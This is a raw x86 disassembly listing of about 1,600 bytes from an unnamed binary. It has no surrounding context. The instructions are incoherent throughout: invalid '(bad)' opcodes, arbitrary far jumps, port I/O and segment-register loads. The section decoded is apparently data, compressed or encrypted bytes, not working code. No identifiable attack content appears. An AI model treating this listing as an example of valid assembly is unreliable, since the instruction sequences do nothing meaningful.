  408868:	std    
  408869:	mov    ecx,0x7c43cf53
  40886e:	sub    BYTE PTR [edi+0x75],dl
  408871:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408872:	sub    dh,dh
  408874:	cmp    al,0xa1
  408876:	adc    BYTE PTR [esi-0x75],cl
  408879:	loopne 0x40882a
  40887b:	gs pop edx
  40887d:	jecxz  0x408828
  40887f:	cmp    al,0xd
  408881:	out    0xd2,al
  408883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408884:	scas   al,BYTE PTR es:[edi]
  408885:	adc    ch,al
  408887:	(bad)  
  408888:	jmp    0x287:0xa42da1ad
  40888f:	sti    
  408890:	lods   eax,DWORD PTR ss:[esi]
  408892:	mov    edx,0xb1c3da31
  408897:	push   edx
  408898:	cwde   
  408899:	enter  0xd8,0x21
  40889d:	ja     0x4088d3
  40889f:	or     DWORD PTR [esi+0x1e6c8a65],ebx
  4088a5:	adc    al,0x7d
  4088a7:	je     0x4088e3
  4088a9:	mov    ds:0x8288c395,eax
  4088ae:	mov    ecx,0xecb725ec
  4088b3:	test   bh,dh
  4088b5:	xchg   esi,eax
  4088b6:	(bad)  
  4088b7:	fldlg2 
  4088b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088ba:	aad    0xb7
  4088bc:	jnp    0x408921
  4088be:	mov    fs,WORD PTR [esi-0x10d22bca]
  4088c4:	rcl    DWORD PTR [ebx-0x5],cl
  4088c7:	push   es
  4088c8:	icebp  
  4088c9:	shl    DWORD PTR [eax-0x1a816894],1
  4088cf:	sbb    dl,ah
  4088d1:	fsub   QWORD PTR [edi]
  4088d3:	adc    ch,BYTE PTR [ebx+0x508d1490]
  4088d9:	add    dh,BYTE PTR [edx]
  4088db:	jp     0x408893
  4088dd:	inc    ebx
  4088de:	mov    ds:0xe0f4adb1,eax
  4088e3:	sti    
  4088e4:	jae    0x4088d3
  4088e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088e7:	loop   0x4088a3
  4088e9:	fmul   DWORD PTR [edi]
  4088eb:	test   dl,cl
  4088ed:	jae    0x408914
  4088ef:	pop    ebp
  4088f0:	inc    esi
  4088f1:	(bad)  
  4088f2:	pop    ecx
  4088f3:	retf   0xa003
  4088f6:	add    DWORD PTR [eax+0x237a6825],eax
  4088fc:	mov    dl,0xbd
  4088fe:	and    dh,dl
  408900:	out    dx,al
  408901:	adc    eax,0x376e1d4b
  408906:	enter  0x94e8,0x38
  40890a:	lods   al,BYTE PTR ds:[esi]
  40890b:	lea    edi,[eax-0x17]
  40890e:	push   esi
  40890f:	das    
  408910:	fisttp WORD PTR [ecx-0x50fa1f60]
  408916:	ins    BYTE PTR es:[edi],dx
  408917:	and    bh,cl
  408919:	(bad)
  40891d:	fisubr DWORD PTR [ebx]
  40891f:	std    
  408920:	scas   al,BYTE PTR es:[edi]
  408921:	mov    ch,0x18
  408923:	out    dx,al
  408924:	jg     0x408902
  408926:	fimul  WORD PTR [eax+0x48]
  408929:	hlt    
  40892a:	push   cs
  40892b:	push   ebp
  40892c:	jp     0x4088ef
  40892e:	test   eax,0x614333b2
  408933:	out    0xa2,eax
  408935:	fdivr  QWORD PTR [eax+0xaa5fe98]
  40893b:	ja     0x408908
  40893d:	jb     0x4089ad
  40893f:	xchg   DWORD PTR [edx-0x5],ebx
  408942:	and    al,0xbd
  408944:	xor    esp,edx
  408946:	fisubr WORD PTR [eax+0x32a59c9a]
  40894c:	out    0x7d,eax
  40894e:	div    BYTE PTR [ecx+0x0]
  408951:	mov    edi,0x5f57352a
  408956:	ins    DWORD PTR es:[edi],dx
  408957:	in     al,0xc0
  408959:	lds    ebp,FWORD PTR [edi+0x26eed2be]
  40895f:	mov    ?,WORD PTR [eax+ecx*1]
  408962:	or     al,0x56
  408964:	clc    
  408965:	dec    esi
  408966:	xor    al,0xf0
  408968:	add    DWORD PTR [edx-0x14e11a2],eax
  40896e:	cmp    eax,0xc6e6e8a0
  408973:	iret   
  408974:	push   ebx
  408975:	mov    WORD PTR [esi-0x5],gs
  408978:	out    dx,eax
  408979:	jnp    0x408984
  40897b:	xchg   esi,eax
  40897c:	pop    ebx
  40897d:	jecxz  0x4089f9
  40897f:	mov    ebx,0x4525cad2
  408984:	inc    ecx
  408985:	(bad)  
  408986:	fidiv  WORD PTR [edi-0x6b]
  408989:	addr16 es out dx,eax
  40898c:	or     eax,0xc9900ea8
  408991:	inc    eax
  408992:	cs push eax
  408994:	adc    eax,0x2591611e
  408999:	test   edi,esi
  40899b:	push   esi
  40899c:	sbb    edi,DWORD PTR [esi+eiz*1+0x8]
  4089a0:	cmp    BYTE PTR [ebp+edi*1-0x36b7ee06],0xa5
  4089a8:	fdiv   st,st(3)
  4089aa:	pop    ecx
  4089ab:	cmp    BYTE PTR [edx+0x60],0x94
  4089af:	push   ebx
  4089b0:	outs   dx,DWORD PTR ds:[esi]
  4089b1:	sub    DWORD PTR [eax],ebp
  4089b3:	adc    esi,DWORD PTR [esi]
  4089b5:	mov    ds:0x5db4b10d,al
  4089ba:	ret    0x709e
  4089bd:	xor    ch,0x8c
  4089c0:	mov    al,ds:0x97e14492
  4089c5:	shl    DWORD PTR [eax-0x6af0c7de],1
  4089cb:	jg     0x408a34
  4089cd:	popa   
  4089ce:	fsubr  st,st(4)
  4089d0:	cmp    BYTE PTR [ebx],0x49
  4089d3:	or     BYTE PTR [edx+eiz*4+0x376eaf3f],dl
  4089da:	fild   QWORD PTR [edx+edx*8+0x71db7e15]
  4089e1:	inc    ebp
  4089e2:	std    
  4089e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089e4:	pop    ebx
  4089e5:	es and ah,dl
  4089e8:	pop    ebp
  4089e9:	popf   
  4089ea:	rcl    DWORD PTR [edx-0x33b615bd],1
  4089f0:	ins    BYTE PTR es:[edi],dx
  4089f1:	fs into 
  4089f3:	mov    edx,0x4ababa22
  4089f8:	mov    ebx,DWORD PTR [edi-0x15]
  4089fb:	mov    bl,ch
  4089fd:	test   BYTE PTR [ebx+0x62],dh
  408a00:	outs   dx,DWORD PTR ds:[esi]
  408a01:	mov    cs,WORD PTR [esi+0x7a]
  408a04:	xchg   ebx,eax
  408a05:	cli    
  408a06:	jmp    0xe372:0x4067c7d2
  408a0d:	test   eax,0x81492d6d
  408a12:	nop
  408a13:	lock push cs
  408a15:	inc    ebx
  408a16:	nop
  408a17:	arpl   WORD PTR [esi+eiz*4+0x2523b58c],sp
  408a1e:	add    eax,0x49594542
  408a23:	pop    edx
  408a24:	push   ebx
  408a25:	sub    al,0xad
  408a27:	mov    ebp,esp
  408a29:	loopne 0x408a77
  408a2b:	pop    esp
  408a2c:	add    esp,0xffffffbe
  408a2f:	repnz scas eax,DWORD PTR es:[edi]
  408a31:	cmp    al,BYTE PTR [ecx-0x28f94303]
  408a37:	push   ds
  408a38:	jecxz  0x408a89
  408a3a:	out    dx,al
  408a3b:	js     0x408a44
  408a3d:	rcr    edx,1
  408a3f:	push   edx
  408a40:	js     0x408aa5
  408a42:	jge    0x408a4f
  408a44:	loopne 0x408a5b
  408a46:	test   eax,0x249f209f
  408a4b:	jmp    DWORD PTR [ebp+eax*2-0x4d]
  408a4f:	addr16 inc edi
  408a51:	mov    ecx,0xb08a3072
  408a56:	shl    BYTE PTR [eax-0x60],1
  408a59:	inc    ecx
  408a5a:	push   edx
  408a5b:	mov    eax,0x64f4314
  408a60:	aaa    
  408a61:	dec    esi
  408a62:	retf   
  408a63:	sub    al,0xf0
  408a65:	cmovl  esp,DWORD PTR [ebp+0x7c372775]
  408a6c:	dec    edx
  408a6d:	push   eax
  408a6e:	and    bh,BYTE PTR [edi-0x63d2d828]
  408a74:	outs   dx,BYTE PTR ds:[esi]
  408a75:	aad    0x62
  408a77:	inc    esi
  408a78:	ins    BYTE PTR es:[edi],dx
  408a79:	push   ecx
  408a7a:	mov    ch,bh
  408a7c:	in     al,0xbe
  408a7e:	pop    ebp
  408a7f:	and    eax,0x676da68c
  408a84:	xchg   ebp,eax
  408a85:	or     DWORD PTR [esi+0xf91bd54],edi
  408a8b:	enter  0x9978,0xa7
  408a8f:	pusha  
  408a90:	sbb    ebp,0x76
  408a93:	xor    DWORD PTR [edx-0x14],esp
  408a96:	bound  eax,QWORD PTR [esi+0x79]
  408a99:	gs loop 0x408b09
  408a9c:	jae    0x408a6b
  408a9e:	xor    bh,cl
  408aa0:	sbb    al,0x5d
  408aa2:	repz or al,0xb2
  408aa5:	ins    DWORD PTR es:[edi],dx
  408aa6:	xchg   edx,eax
  408aa7:	jge    0x408ad8
  408aa9:	lea    edi,[esi]
  408aab:	pop    ecx
  408aac:	fnstsw WORD PTR [ebx+ebx*8]
  408aaf:	lahf   
  408ab0:	cwde   
  408ab1:	retw   0xaa79
  408ab5:	inc    ebp
  408ab6:	out    dx,al
  408ab7:	adc    edx,DWORD PTR [esi-0x7]
  408aba:	cmp    eax,0x851bc9b
  408abf:	or     DWORD PTR [esi+ebp*4+0x47],esp
  408ac3:	rcr    BYTE PTR [edx],1
  408ac5:	aad    0x9c
  408ac7:	add    al,0x80
  408ac9:	stos   DWORD PTR es:[edi],eax
  408aca:	jno    0x408b32
  408acc:	imul   ebp,DWORD PTR [eax-0x4d],0xb3fbf6f1
  408ad3:	pusha  
  408ad4:	mov    bl,0xa9
  408ad6:	pop    ebp
  408ad7:	push   ecx
  408ad8:	outs   dx,DWORD PTR ds:[esi]
  408ad9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ada:	inc    ebp
  408adb:	in     eax,dx
  408adc:	add    edx,DWORD PTR [ebp+0xcdd946e]
  408ae2:	xchg   ebx,eax
  408ae3:	fild   WORD PTR [esi+0x7d]
  408ae6:	bound  esi,QWORD PTR [ebp-0x25]
  408ae9:	arpl   WORD PTR [ebx-0x6cde91d3],di
  408aef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408af0:	and    eax,0x7634dbdf
  408af5:	mov    ds:0xe4c7487e,eax
  408afa:	loopne 0x408b39
  408afc:	pop    ss
  408afd:	mov    ah,0xd9
  408aff:	sub    cl,BYTE PTR [ecx+0x13adcd17]
  408b05:	and    BYTE PTR [ebx+0x78a3a6bf],al
  408b0b:	clc    
  408b0c:	or     ah,dl
  408b0e:	xor    al,0x5c
  408b10:	sub    eax,0xbd8431fa
  408b15:	jmp    0xd7f6:0x48118ab7
  408b1c:	xor    eax,0xfe55c93c
  408b21:	mov    ds:0x4883d8ec,eax
  408b26:	mov    ebx,0xd2c3a2d2
  408b2b:	fidiv  WORD PTR [ebx+0x5227a47a]
  408b31:	mov    ah,BYTE PTR [ebx-0x70]
  408b34:	pop    ds
  408b35:	clc    
  408b36:	add    BYTE PTR [edi],0x5d
  408b39:	rcl    BYTE PTR ds:0x51c276cd,cl
  408b3f:	cld    
  408b40:	xchg   ebx,eax
  408b41:	cdq    
  408b42:	dec    ebp
  408b43:	dec    BYTE PTR [edi+0x2f]
  408b46:	je     0x408bbf
  408b48:	push   0x45
  408b4a:	pop    ss
  408b4b:	push   ecx
  408b4c:	dec    ecx
  408b4d:	jbe    0x408bbc
  408b4f:	sbb    DWORD PTR [esi-0x10067eea],ecx
  408b55:	jbe    0x408b6d
  408b57:	ret    
  408b58:	mov    ch,0x4e
  408b5a:	pop    esi
  408b5b:	ja     0x408b9d
  408b5d:	cmp    al,0x38
  408b5f:	jecxz  0x408b88
  408b61:	mov    al,ds:0xe788c04a
  408b66:	or     DWORD PTR [edi+0x51eaec44],0xb6d92ce4
  408b70:	leave  
  408b71:	loopne 0x408af8
  408b73:	xchg   ebp,eax
  408b74:	mov    esp,0x9651501f
  408b79:	push   0x9bab37ea
  408b7e:	push   cs
  408b7f:	add    eax,0xa9b58b4f
  408b84:	call   0xf30f:0xdacc95a
  408b8b:	add    BYTE PTR [edx],ch
  408b8d:	shr    BYTE PTR [edx-0x1c861176],0x68
  408b94:	pop    edi
  408b95:	dec    ebp
  408b96:	das    
  408b97:	add    DWORD PTR [ebx+eiz*1-0x23ef5b02],ebx
  408b9e:	xchg   esi,eax
  408b9f:	fbld   TBYTE PTR [ebp-0x3b]
  408ba2:	ret    0x4f98
  408ba5:	aas    
  408ba6:	test   DWORD PTR [ebx-0x38],esp
  408ba9:	mov    al,ds:0x10104483
  408bae:	ds out 0x96,eax
  408bb1:	mov    fs,WORD PTR [ebx]
  408bb3:	cdq    
  408bb4:	or     eax,0x300cc246
  408bb9:	sbb    BYTE PTR [edi-0x5],bl
  408bbc:	xor    eax,0x295b658
  408bc1:	pop    ss
  408bc2:	dec    ebx
  408bc3:	xlat   BYTE PTR ds:[ebx]
  408bc4:	add    esi,DWORD PTR ss:[edx]
  408bc7:	mov    WORD PTR [edi+0x55],es
  408bca:	mov    ebp,0xcdbb829a
  408bcf:	mov    edx,0x556af9a5
  408bd4:	push   DWORD PTR [edx+edx*1]
  408bd7:	mov    cl,0xbf
  408bd9:	inc    ebp
  408bda:	ret    0x4ef
  408bdd:	jmp    0x408beb
  408bdf:	les    edi,FWORD PTR [eax+0x696dfa18]
  408be5:	mov    al,0x9d
  408be7:	sub    ebp,esi
  408be9:	push   edx
  408bea:	lds    ebp,FWORD PTR [ecx+0x78]
  408bed:	icebp  
  408bee:	sub    esp,DWORD PTR [eax+ebx*8-0x54c7da2d]
  408bf5:	cmc    
  408bf6:	or     BYTE PTR [edi+0x1a],dh
  408bf9:	mov    ?,WORD PTR [ebx-0x2521426]
  408bff:	fistp  QWORD PTR [ebp-0x742f624a]
  408c05:	xchg   ebp,eax
  408c06:	lahf   
  408c07:	sbb    ebp,DWORD PTR [esi-0x47ad1056]
  408c0d:	out    dx,al
  408c0e:	inc    eax
  408c0f:	ins    BYTE PTR es:[edi],dx
  408c10:	shr    DWORD PTR [eax],cl
  408c12:	shl    bh,1
  408c14:	xor    BYTE PTR [edi+edi*8],0xd7
  408c18:	sbb    eax,0xf885fe76
  408c1d:	xlat   BYTE PTR ds:[ebx]
  408c1e:	mov    eax,0xf4296057
  408c23:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  408c25:	ror    DWORD PTR [esi-0x2d053ae6],cl
  408c2b:	shl    BYTE PTR [esi+edx*8],cl
  408c2e:	loope  0x408c0f
  408c30:	ficomp WORD PTR [edx+0x28]
  408c33:	add    al,0x7f
  408c35:	retf   
  408c36:	mov    al,ds:0xbf22cc37
  408c3b:	dec    edx
  408c3c:	add    eax,0x88cd240a
  408c41:	mov    al,bh
  408c43:	jg     0x408c76
  408c45:	pop    edx
  408c46:	adc    al,bl
  408c48:	mov    bh,0xf7
  408c4a:	retf   
  408c4b:	iret   
  408c4c:	cmp    eax,0xe3825695
  408c51:	test   edx,ebp
  408c53:	mov    al,0x13
  408c55:	stos   DWORD PTR es:[edi],eax
  408c56:	inc    ebx
  408c57:	call   0xda571099
  408c5c:	pop    ebx
  408c5d:	pop    ds
  408c5e:	or     ch,BYTE PTR [edx+0x597fceae]
  408c64:	jnp    0x408be7
  408c66:	add    DWORD PTR es:[edi+ebp*1+0x1a],esp
  408c6b:	jmp    0x8d8f0340
  408c70:	aad    0x4b
  408c72:	cmp    ch,dl
  408c74:	test   eax,0x7a0ace5b
  408c79:	imul   DWORD PTR [eax+0x64]
  408c7c:	adc    ecx,DWORD PTR [ebx+0x15]
  408c7f:	mov    ds:0xe780c8c4,al
  408c84:	cmp    al,0xe1
  408c86:	imul   ebp,DWORD PTR [eax+edi*1],0xe43622e9
  408c8d:	lock adc DWORD PTR [edi-0x76],esp
  408c91:	push   es
  408c92:	xor    ch,BYTE PTR [edi]
  408c94:	lds    ebp,FWORD PTR es:0x1cd10e56
  408c9b:	shl    BYTE PTR [ecx-0x3610a5d1],1
  408ca1:	std    
  408ca2:	jg     0x408c77
  408ca4:	icebp  
  408ca5:	cmp    eax,0xb2b61798
  408caa:	jge    0x408c87
  408cac:	pop    edx
  408cad:	(bad)  
  408caf:	inc    edi
  408cb0:	(bad)  
  408cb1:	push   ss
  408cb2:	in     eax,dx
  408cb3:	pop    eax
  408cb4:	push   es
  408cb5:	or     bx,WORD PTR [ebx+eax*1-0x79]
  408cba:	mov    eax,ds:0x1d99a002
  408cbf:	mov    al,BYTE PTR [eax]
  408cc1:	jns    0x408cae
  408cc3:	stos   BYTE PTR es:[edi],al
  408cc4:	mov    edx,0x27b79a29
  408cc9:	dec    eax
  408cca:	add    ebp,DWORD PTR [esi]
  408ccc:	lods   eax,DWORD PTR ds:[esi]
  408ccd:	fild   WORD PTR [ecx]
  408ccf:	add    DWORD PTR [edi],ebp
  408cd1:	pusha  
  408cd2:	add    DWORD PTR [edi-0x72da86f0],0xffffffc7
  408cd9:	adc    BYTE PTR [ebp-0xdc02ef1],dh
  408cdf:	test   al,dh
  408ce1:	dec    esi
  408ce2:	out    0xc2,eax
  408ce4:	imul   DWORD PTR [ebp+0x40]
  408ce7:	fbstp  TBYTE PTR [esi-0x2]
  408cea:	fidiv  WORD PTR [edi-0x3c]
  408ced:	dec    eax
  408cee:	push   ecx
  408cef:	iret   
  408cf0:	cdq    
  408cf1:	(bad)  [ecx]
  408cf3:	jnp    0x408d1d
  408cf5:	or     edi,DWORD PTR [eax]
  408cf7:	jge    0x408d4f
  408cf9:	or     eax,0x75846a23
  408cfe:	mov    eax,0x48b9f4c3
  408d03:	pusha  
  408d04:	aas    
  408d05:	lock sub BYTE PTR [ebp+0x9],0xc2
  408d0a:	ja     0x408d0f
  408d0c:	adc    BYTE PTR [eax-0x2f1f3a23],dl
  408d12:	inc    esi
  408d13:	aad    0x6c
  408d15:	inc    ebx
  408d16:	mov    ds:0xd850086c,al
  408d1b:	in     eax,0x5f
  408d1d:	add    BYTE PTR [ebp-0x18],ch
  408d20:	ficomp WORD PTR [eax]
  408d22:	ss in  al,dx
  408d24:	inc    esp
  408d25:	sub    al,0xb3
  408d27:	ror    BYTE PTR [ebx-0x7a2fab0],1
  408d2d:	cmp    DWORD PTR [esi],edx
  408d2f:	leave  
  408d30:	add    BYTE PTR [ecx],0x3
  408d33:	adc    DWORD PTR [ecx+ebx*1-0xee39dd6],edx
  408d3a:	mov    cl,0x7e
  408d3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d3d:	mov    DWORD PTR [ebx+0x6e],edx
  408d40:	dec    ebp
  408d41:	xor    eax,0x4a272c18
  408d46:	jle    0x408d9e
  408d48:	pop    es
  408d49:	or     DWORD PTR ds:0xe0451c65,esi
  408d4f:	cli    
  408d50:	call   DWORD PTR [edx-0x6dfcdf26]
  408d56:	push   cs
  408d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d58:	and    DWORD PTR [ebx-0x25],0x2a
  408d5c:	(bad)  
  408d5d:	stos   DWORD PTR es:[edi],eax
  408d5e:	mov    ah,0x74
  408d60:	stos   DWORD PTR es:[edi],eax
  408d61:	ss push esp
  408d63:	mov    eax,ds:0x430b0697
  408d68:	clc    
  408d69:	mov    ebx,0x546f826d
  408d6e:	adc    ah,BYTE PTR [edi]
  408d70:	inc    ebp
  408d71:	cli    
  408d72:	out    0x5a,eax
  408d74:	ja     0x408d8a
  408d76:	(bad)  
  408d77:	mov    edx,0xd6c71cd1
  408d7c:	add    eax,0x6c5b305b
  408d81:	xchg   ebx,eax
  408d82:	loopne 0x408dec
  408d84:	addr16 dec ebp
  408d86:	push   ebp
  408d87:	inc    edx
  408d88:	mov    ecx,0xec9fd1c7
  408d8d:	mov    ds:0x304eaa4a,eax
  408d92:	cmp    ebx,eax
  408d94:	pop    esp
  408d95:	jb     0x408dc1
  408d97:	fwait
  408d98:	mov    WORD PTR [eax-0x5d],fs
  408d9b:	sbb    DWORD PTR [eax+0x1c],edx
  408d9e:	jmp    0x7eee:0xa6fd327b
  408da5:	out    dx,al
  408da6:	mov    dl,0xe7
  408da8:	fstp   DWORD PTR [ebx]
  408daa:	shr    DWORD PTR [edi],0x4
  408dad:	rcr    BYTE PTR [esi+esi*2+0x35],0x8
  408db2:	cwde   
  408db3:	dec    esi
  408db4:	jle    0x408d89
  408db6:	icebp  
  408db7:	inc    ebp
  408db8:	(bad)  
  408db9:	fild   QWORD PTR [eax+0x45703df6]
  408dbf:	imul   eax
  408dc1:	shl    BYTE PTR [edx*1+0x49aa0171],1
  408dc8:	mov    eax,ds:0x38a77949
  408dcd:	lock dec ebp
  408dcf:	mov    al,ds:0x729efe95
  408dd4:	ja     0x408e31
  408dd6:	(bad)  [ecx+0x6a2d5b3]
  408ddc:	cmc    
  408ddd:	mov    ch,0x6
  408ddf:	push   ecx
  408de0:	inc    edi
  408de1:	aam    0xd0
  408de3:	jnp    0x408e2f
  408de5:	aad    0xb
  408de7:	mov    DWORD PTR [esi],ebx
  408de9:	xchg   BYTE PTR [edi-0x67df9b0e],bh
  408def:	inc    edi
  408df0:	inc    esp
  408df1:	retf   0x2e5
  408df4:	mov    DWORD PTR [esi-0x1001f017],0xb0f008d8
  408dfe:	pusha  
  408dff:	stc    
  408e00:	and    eax,0xddf0880b
  408e05:	scas   eax,DWORD PTR es:[edi]
  408e06:	jns    0x408e6b
  408e08:	shl    DWORD PTR [ebx],1
  408e0a:	mov    ch,0x68
  408e0c:	jnp    0x408da4
  408e0e:	dec    edi
  408e0f:	add    BYTE PTR [edx],0xcf
  408e12:	jb     0x408df8
  408e14:	sar    DWORD PTR ds:0xafc74b5,0x24
  408e1b:	retf   
  408e1c:	xchg   edx,eax
  408e1d:	es das 
  408e1f:	push   0x76713564
  408e24:	mov    bh,0x4e
  408e26:	das    
  408e27:	pop    ebx
  408e28:	cmp    BYTE PTR [esi+0x6c97be48],0x2d
  408e2f:	inc    eax
  408e30:	scas   eax,DWORD PTR es:[edi]
  408e31:	lods   al,BYTE PTR ds:[esi]
  408e32:	add    esi,edx
  408e34:	sbb    DWORD PTR [esi+esi*8+0x35],0x6
  408e39:	fdiv   QWORD PTR [ebx]
  408e3b:	sbb    eax,DWORD PTR [ebx+0x6d2698a7]
  408e41:	mov    eax,0xf7bdf6e6
  408e46:	xor    BYTE PTR [edx+0x71],0x61
  408e4a:	jo     0x408e46
  408e4c:	shl    BYTE PTR [eax-0xf],1
  408e4f:	push   ebp
  408e50:	lea    edi,[ecx-0x9]
  408e53:	jecxz  0x408dff
  408e55:	and    DWORD PTR [eax],edi
  408e57:	dec    ebx
  408e58:	mov    dl,0xb6
  408e5a:	cwde   
  408e5b:	xchg   ebp,eax
  408e5c:	jmp    0x7a90:0xb5a90f2b
  408e63:	pop    esp
  408e64:	add    DWORD PTR [esi],eax
  408e66:	test   bl,cl
  408e68:	(bad)  
  408e6b:	pushf  
  408e6c:	mov    ah,0x1e
  408e6e:	ja     0x408e48
  408e70:	pushf  
  408e71:	or     al,0xb9
  408e73:	mov    ds:0x48e775aa,al
  408e78:	and    DWORD PTR [edi+ebx*1-0xa],ecx
  408e7c:	mov    cl,0x70
  408e7e:	les    edi,FWORD PTR [ebx+0x2b881ca]
  408e84:	inc    edi
  408e85:	lock icebp 
  408e87:	jns    0x408eec
  408e89:	shl    dl,1
  408e8b:	repnz xchg edi,eax
  408e8d:	inc    edi
  408e8e:	dec    ebp
  408e8f:	mov    ch,0xb
  408e91:	jne    0x408e32
  408e93:	sub    eax,0x22a5f7a0
  408e98:	mov    ecx,0x52b90c6a
  408e9d:	sbb    al,BYTE PTR [esi]
  408e9f:	(bad)  
  408ea0:	cmp    bh,BYTE PTR [eax-0x65]
  408ea3:	call   0x55a1c6b2
  408ea8:	push   cs
  408ea9:	lods   eax,DWORD PTR ds:[esi]
  408eaa:	cmp    ah,BYTE PTR [eax-0x7]
  408ead:	pop    edx
  408eae:	mov    BYTE PTR [eax+ecx*8+0x3c],bh
  408eb2:	sub    al,0x78
  408eb4:	lock jecxz 0x408eed
  408eb7:	inc    edi
  408eb8:	push   esp
  408eb9:	pop    es
  408eba:	inc    esi
  408ebb:	mov    ebp,0x687ef0f5
  408ec0:	test   BYTE PTR [esi-0x29],0x38
  408ec4:	mov    fs,WORD PTR [ebx]
  408ec6:	push   ss
  408ec7:	dec    edi
  408ec8:	mov    esp,0x1f75e90d
  408ecd:	in     eax,0xd1
  408ecf:	outs   dx,DWORD PTR ds:[esi]
  408ed0:	mov    dl,0xd4
  408ed2:	test   eax,0xa5ac4d0b
  408ed7:	faddp  st(1),st
  408ed9:	pushf  
  408eda:	and    eax,DWORD PTR [edx-0x199fb00a]
  408ee0:	sbb    DWORD PTR [eax],esi
  408ee2:	add    ecx,DWORD PTR [ecx+ebp*2]
  408ee5:	nop
  408ee6:	sbb    BYTE PTR [esi+0x220b161c],bl
  408eec:	add    dh,dh
  408eee:	lods   eax,DWORD PTR ds:[esi]
  408eef:	mov    ecx,ss
  408ef1:	ror    BYTE PTR [edi+ebp*1-0x46],cl
  408ef5:	adc    DWORD PTR [ebx],esp
  408ef7:	jmp    0x408ec1
  408ef9:	mov    al,ds:0x6115d209
  408efe:	or     al,0x22
  408f00:	jge    0x408f38
  408f02:	mov    al,0x61
  408f04:	push   esi
  408f05:	jo     0x408f69
  408f07:	jg     0x408f15
  408f09:	loop   0x408eac
  408f0b:	push   ebx
  408f0c:	jns    0x408f67
  408f0e:	cmp    BYTE PTR fs:[eax],ch
  408f11:	or     dh,BYTE PTR ds:0x363d666a
  408f17:	add    DWORD PTR [edx-0x75],esp
  408f1a:	cmp    DWORD PTR [ebx],esp
  408f1c:	jge    0x408f0c
  408f1e:	lds    edi,FWORD PTR [ecx+ecx*4-0x6f09b432]
  408f25:	xor    eax,0xf7d8adf8
  408f2a:	adc    dl,BYTE PTR [ecx]
  408f2c:	loopne 0x408f4c
  408f2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f2f:	jo     0x408ef3
  408f31:	nop
  408f32:	sub    eax,DWORD PTR [ebx-0xe34f16d]
  408f38:	cdq    
  408f39:	sbb    BYTE PTR [esi],0x14
  408f3c:	fmul   st,st(0)
  408f3e:	inc    ecx
  408f3f:	fwait
  408f40:	ss (bad) 
  408f42:	sbb    eax,ebx
  408f44:	push   es
  408f45:	sub    BYTE PTR [edi+edx*8+0x23c0b325],dh
  408f4c:	ins    DWORD PTR es:[edi],dx
  408f4d:	adc    BYTE PTR [edx+ebp*2-0x5b],dh
  408f51:	(bad)  
  408f52:	and    bl,cl
  408f54:	sub    BYTE PTR [esi+ebx*4],0xda
  408f58:	aam    0x43
  408f5a:	pop    ebx
  408f5b:	scas   al,BYTE PTR es:[edi]
  408f5c:	repnz ror BYTE PTR [eax],cl
  408f5f:	imul   DWORD PTR [esi]
  408f61:	pusha  
  408f62:	and    eax,0xc1843c79
  408f67:	std    
  408f68:	(bad)
  408f6b:	mov    eax,0x9d7cf7
  408f70:	jmp    0x2dce:0x44b84f91
  408f77:	out    0xfb,eax
  408f79:	mov    bh,BYTE PTR [ebx+0x3c539776]
  408f7f:	dec    esi
  408f80:	pop    eax
  408f81:	cdq    
  408f82:	scas   al,BYTE PTR es:[edi]
  408f83:	repz (bad) 
  408f85:	in     eax,dx
  408f86:	sub    al,0xb5
  408f88:	add    eax,0x2fcc02c5
  408f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f8f:	mov    edx,0xdf564449
  408f94:	lods   eax,DWORD PTR ds:[esi]
  408f95:	push   ds
  408f96:	hlt    
  408f97:	or     al,0x80
  408f99:	sub    dh,BYTE PTR [eax+0x7677aaab]
  408f9f:	pop    eax
  408fa0:	mov    edi,0x71ea3858
  408fa5:	cwde   
  408fa6:	mov    bh,0x2d
  408fa8:	aam    0x19
  408faa:	mov    ah,0x2c
  408fac:	mov    dl,BYTE PTR [edx]
  408fae:	mov    dh,0xdd
  408fb0:	out    0x41,al
  408fb2:	gs push ebp
  408fb4:	je     0x408fa8
  408fb6:	test   BYTE PTR [ebx+0x342f3616],0x36
  408fbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fbe:	adc    al,0x69
  408fc0:	push   ecx
  408fc1:	fiadd  DWORD PTR [ecx+0x7d09de89]
  408fc7:	inc    edi
  408fc8:	aaa    
  408fc9:	adc    al,0xc0
  408fcb:	add    BYTE PTR [ebx+0x5e],cl
  408fce:	mul    DWORD PTR [ecx]
  408fd0:	clc    
  408fd1:	enter  0x9a2e,0x3f
  408fd5:	cmp    al,0x23
  408fd7:	mov    ecx,0xc603d64f
  408fdc:	cmp    ch,dl
  408fde:	xchg   ebx,eax
  408fdf:	adc    BYTE PTR [eax+0x2a5f965a],dh
  408fe5:	cmp    al,BYTE PTR [edi]
  408fe7:	stos   BYTE PTR es:[edi],al
  408fe8:	xor    esi,edi
  408fea:	inc    ebx
  408feb:	cmp    al,0x60
  408fed:	scas   eax,DWORD PTR es:[edi]
  408fee:	scas   al,BYTE PTR es:[edi]
  408fef:	or     ebx,ebx
  408ff1:	(bad)  
  408ff2:	arpl   dx,di
  408ff4:	outs   dx,DWORD PTR ds:[esi]
  408ff5:	lea    ecx,[edi]
  408ff7:	or     BYTE PTR [ebp-0xf],0x57
  408ffb:	pusha  
  408ffc:	cmp    eax,DWORD PTR [ecx+0x76d2ef7c]
  409002:	out    dx,al
  409003:	mov    esp,0xaa2c1d8f
  409008:	shl    BYTE PTR [ecx],1
  40900a:	pop    esp
  40900b:	xchg   BYTE PTR [esi-0x1125a2],ch
  409011:	jp     0x408ff9
  409013:	jecxz  0x409017
  409015:	imul   ebp,DWORD PTR [edx-0x2601537a],0x4d
  40901c:	dec    ebp
  40901d:	sar    BYTE PTR [edx+0x789a8a1f],cl
  409023:	xchg   edx,eax
  409024:	sar    DWORD PTR [edi+0x3b6e4d62],0xa2
